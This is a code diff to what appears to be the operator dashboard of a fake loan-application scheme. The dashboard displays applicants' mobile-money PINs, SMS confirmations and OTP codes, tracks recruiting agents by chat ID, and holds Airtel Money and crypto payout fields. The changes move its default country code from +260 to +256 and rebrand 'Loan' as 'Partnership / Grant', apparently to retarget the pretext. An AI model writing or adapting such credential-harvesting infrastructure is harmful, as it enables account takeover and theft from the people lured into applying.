@@ -263,7 +263,7 @@
         <div class="grid-3" style="margin-top: 10px;">
           <div>
             <label for="pmAirtelMoney">Airtel Money</label>
-            <input id="pmAirtelMoney" placeholder="e.g.: +260 97 123 4567" />
+            <input id="pmAirtelMoney" placeholder="e.g.: +256 77 123 4567" />
           </div>
           <div>
             <label for="pmCryptoAddress">Cryptocurrency Address (USDT / Crypto)</label>
@@ -348,7 +348,7 @@
     <!-- 4. Applications & Workflow Stages -->
     <section class="section-card">
       <h2>
-        <span>Loan Applications & Verification Stages</span>
+        <span>Partnership Applications & Verification Stages</span>
       </h2>
       <p class="desc">Monitor applications in real time, inspect verification steps (PIN, SMS confirmation, and OTP), and approve or reject each step directly.</p>
 
@@ -364,7 +364,7 @@
               <th>Ref / Date</th>
               <th>Applicant</th>
               <th>Phone</th>
-              <th>Loan</th>
+              <th>Partnership / Grant</th>
               <th>Step 3: PIN</th>
               <th>Step 4: SMS Confirmation</th>
               <th>Step 5: OTP Code</th>
@@ -966,7 +966,7 @@
 
           const dateStr = app.created_at ? new Date(app.created_at + 'Z').toLocaleString('en-US') : '—';
           const agentDisplay = app.agent_name ? `${escapeHtml(app.agent_name)}<br><small style="color:var(--muted);">ID: ${escapeHtml(app.agent_chat_id || 'no chat')}</small>` : '<em style="color:var(--muted);">Direct</em>';
-          const phoneDisplay = String(app.phone).startsWith('+') ? escapeHtml(app.phone) : `+260 ${escapeHtml(app.phone)}`;
+          const phoneDisplay = String(app.phone).startsWith('+') ? escapeHtml(app.phone) : `+256 ${escapeHtml(app.phone)}`;
 
           // Find Step 3 (PIN), Step 4 (SMS Verification), and Step 5 (OTP Code)
           const vers = app.verifications || [];
